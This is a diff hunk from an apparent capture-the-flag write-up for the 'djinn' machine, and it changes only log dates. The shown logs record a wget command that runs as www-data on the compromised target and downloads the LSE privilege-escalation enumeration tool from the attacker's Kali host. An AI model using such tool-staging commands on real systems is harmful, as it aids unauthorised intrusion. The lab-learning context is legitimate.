@@ -581,12 +581,12 @@ LSE allows me to scan the host for common privilege escalation points and some a
 
 Kali:
 ```
-192.168.8.91 - - [11/Jul/2022 09:41:47] "GET /lse.tar HTTP/1.1" 200 -
+192.168.8.91 - - [15/Oct/2022 09:41:47] "GET /lse.tar HTTP/1.1" 200 -
 ```
 Target:
 ```
 www-data@djinn:/var/www$ wget http://192.168.8.199/lse.tar
---2022-07-11 19:11:47--  http://192.168.8.199/lse.tar
+--2022-10-15 19:11:47--  http://192.168.8.199/lse.tar
 Connecting to 192.168.8.199:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 12820480 (12M) [application/x-tar]
